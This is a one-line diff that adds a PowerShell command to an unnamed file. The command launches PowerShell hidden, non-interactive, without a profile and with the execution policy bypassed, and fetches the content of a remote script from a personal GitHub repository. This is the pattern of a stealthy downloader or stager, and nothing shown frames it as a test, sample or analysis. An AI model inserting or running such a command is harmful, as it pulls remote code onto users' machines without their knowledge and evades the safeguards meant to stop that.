@@ -1,0 +1,1 @@
+powershell -nop -W hidden -noni -ep bypass -c  (Invoke-WebRequest "https://raw.githubusercontent.com/DogyGamer/Files/main/1.ps1").content
